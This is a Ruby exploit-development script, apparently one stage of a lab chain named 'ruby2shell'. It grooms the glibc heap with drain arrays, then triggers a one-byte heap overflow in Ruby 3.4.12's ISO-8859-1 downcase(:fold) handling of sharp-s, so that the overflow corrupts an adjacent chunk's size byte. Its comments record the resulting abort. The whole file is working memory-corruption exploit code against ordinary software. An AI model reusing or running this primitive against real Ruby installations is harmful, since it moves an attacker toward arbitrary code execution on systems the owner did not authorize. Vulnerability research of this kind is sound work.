# Stage A fold variant — same geometry, second overflow byte 0x73.
#
# Identical to ruby2shell-stageA.rb except the case operation is
# downcase(:fold) instead of upcase: the SHARP_s branch writes
# 's' + code('s') (iso_8859_1.c:277-278), so the one-byte overflow
# writes 0x73 ('s') instead of 0x53 ('S'). Observed (2026-11-20):
# same deterministic abort, mtrace free-hook reads the victim's size
# LSB as 0x373 (vs 0x353 for upcase) — 0x331 | 0x43: the byte landed
# at the same chosen chunk and offset.
#
# Run: MTRACE_FD=2 LD_PRELOAD=.../mtrace.so \
#      lab/build/plain/ruby-3.4.12-plain/bin/ruby <this>
def marker(s)
  STDERR.write(s); STDERR.flush
end
marker("===SETTLE===\n")
GC.start

# Drain tcache AND smallbin holes for the 0x340 (request 809..824) and
# 0x330 (request 793..808) chunk classes so the primer's buffers are
# carved sequentially from the top chunk (adjacent).
drain340 = Array.new(512) { "d" * 823 }  # request 824 -> 0x340
drain330 = Array.new(512) { "e" * 800 }  # request 801 -> 0x330

marker("===PRIMER===\n")
# Pure sharp-s, 780 chars: fills buffer1' to exactly capa (no overflow)
# and chains one adjacent buffer2'.
primer = ("\xDF".b * 780)
primer.force_encoding(Encoding::ISO_8859_1)
t1 = primer.downcase(:fold)
raise "primer geometry broken" unless t1.bytesize == 1560

marker("===REAL===\n")
# Mixed input: same 780-char source length -> same buffer1 request 824,
# but 'a' + pairs flip the parity so the last pair overflows by one
# byte onto the adjacent chunk's size LSB (this time with 0x73).
s = ("a".b + "\xDF".b * 779)
s.force_encoding(Encoding::ISO_8859_1)
t2 = s.downcase(:fold)

print "N=779 fold ok, out len=#{t2.bytesize} — NO ABORT, placement failed\n"
